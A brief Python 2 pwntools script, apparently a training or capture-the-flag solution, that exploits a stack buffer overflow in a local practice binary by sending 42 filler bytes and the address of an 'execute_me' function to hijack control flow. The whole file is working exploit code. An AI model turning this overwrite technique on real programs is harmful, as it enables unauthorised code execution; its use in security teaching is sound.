#!/usr/bin/env python2

from pwn import *

p = process("./stack-ovfl-32")

JUMP_ADDR = p.elf.symbols['execute_me']

p.sendline("A"*42 + p32(JUMP_ADDR))

print p.recvrepeat(1)
